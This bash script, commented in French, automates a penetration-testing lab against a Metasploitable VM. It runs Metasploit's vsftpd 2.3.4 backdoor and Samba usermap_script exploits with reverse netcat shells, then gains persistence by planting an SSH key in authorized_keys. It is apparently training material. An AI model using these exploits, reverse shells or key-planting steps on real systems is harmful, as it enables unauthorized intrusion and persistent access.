#!/bin/bash
# =====================================================================
# lab_j2.sh — Jour 2 : Test de pénétration Metasploitable
#   Reconnaissance → Exploitation vsftpd → Exploitation Samba → Persistance
#
# Usage: bash lab_j2.sh [cible_ip] [-y]
#   cible_ip: IP Metasploitable (defaut: env.sh METASPLOITABLE_IP)
#   -y: mode automatique (pas de confirmation)
# =====================================================================
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)/env.sh"

RHOST="${1:-$METASPLOITABLE_IP}"
AUTO=0
[ "${2:-}" = "-y" ] && AUTO=1
TIMEOUT="30"
prompt() { [ "$AUTO" = 1 ] && return 0; echo "$1"; read -r; }

echo "============================================================"
echo "  J2 — Test de pénétration Metasploitable ($RHOST)"
echo "============================================================"
echo ""

# ------------------------------------------------------------------
# LAB-1 — Reconnaissance
# ------------------------------------------------------------------
run_recon() {
  echo "--- LAB-1 — Reconnaissance ---"
  bash "$SCRIPT_DIR/recon.sh" "$RHOST"
  echo ""
}

# ------------------------------------------------------------------
# LAB-2 — Exploitation vsftpd 2.3.4 (CVE-2011-2523)
# ------------------------------------------------------------------
run_vsftpd() {
  echo "--- LAB-2 — Exploitation vsftpd backdoor ---"
  local RC=$(mktemp)
  cat > "$RC" <<-EOF
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $RHOST
set RPORT 21
set PAYLOAD cmd/unix/reverse_netcat
set LHOST $LHOST
set LPORT $LPORT
set VERBOSE true
run -z
sessions -i 1 -c "id; uname -a; ip addr"
exit
EOF
  echo "[*] Lancement du module vsftpd_234_backdoor..."
  timeout $TIMEOUT msfconsole -q -r "$RC" 2>/dev/null
  rm -f "$RC"
  echo ""
}

# ------------------------------------------------------------------
# LAB-3 — Exploitation Samba usermap_script (CVE-2007-2447)
# ------------------------------------------------------------------
run_samba() {
  echo "--- LAB-3 — Exploitation Samba usermap_script ---"
  # Nettoyer tout processus residuel sur le port
  pkill -f "nc.*$LPORT_SAMBA" 2>/dev/null || true
  local RC=$(mktemp)
  cat > "$RC" <<-EOF
use exploit/multi/samba/usermap_script
set RHOSTS $RHOST
set RPORT 445
set LHOST $LHOST
set LPORT $LPORT_SAMBA
set PAYLOAD cmd/unix/reverse_netcat
set VERBOSE true
run -z
sessions -i 1 -c "id; uname -a; whoami"
exit
EOF
  echo "[*] Lancement du module usermap_script..."
  timeout $TIMEOUT msfconsole -q -r "$RC" 2>/dev/null
  rm -f "$RC"
  echo ""
}

# ------------------------------------------------------------------
# LAB-3 — Persistance : copie de cle SSH (dans LAB-3)
# ------------------------------------------------------------------
run_persistence() {
  echo "--- LAB-3 — Persistance SSH ---"
  if [ ! -f ~/.ssh/id_rsa.pub ]; then
    ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N "" -q
  fi
  HOST_KEY=$(cat ~/.ssh/id_rsa.pub)
  echo "[*] Ajout de la cle SSH via vsftpd backdoor..."
  local RC=$(mktemp)
  cat > "$RC" <<-EOF
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $RHOST
set RPORT 21
set PAYLOAD cmd/unix/reverse_netcat
set LHOST $LHOST
set LPORT $LPORT
set VERBOSE false
run -z
sessions -i 1 -c "mkdir -p /home/msfadmin/.ssh && echo '$HOST_KEY' >> /home/msfadmin/.ssh/authorized_keys && chown -R msfadmin:msfadmin /home/msfadmin/.ssh && chmod 600 /home/msfadmin/.ssh/authorized_keys && chmod 700 /home/msfadmin/.ssh && echo OK"
exit
EOF
  timeout 30 msfconsole -q -r "$RC" 2>/dev/null | grep -E "(OK|Backdoor|opened)"
  rm -f "$RC"
  echo "[*] Test de connexion SSH sans mot de passe..."
  timeout 10 ssh -o StrictHostKeyChecking=no \
    -o HostKeyAlgorithms=ssh-rsa \
    -o PubkeyAcceptedKeyTypes=ssh-rsa \
    "msfadmin@$RHOST" "id; whoami; hostname" 2>&1
  echo ""
}

# =====================================================================
# Main
# =====================================================================
echo "[+] Cible: $RHOST"
echo "[+] LHOST: $LHOST (gateway)"
echo "[+] LPORT: $LPORT (defaut), $LPORT_SAMBA (samba)"
echo ""

run_recon
prompt "[?] Passer l'exploitation ? (Entree pour continuer)"

run_vsftpd
prompt "[?] Continuer vers Samba ? (Entree pour continuer)"

run_samba
prompt "[?] Configurer la persistance SSH ? (Entree pour continuer)"

run_persistence

echo "============================================================"
echo "  J2 termine."
echo "============================================================"
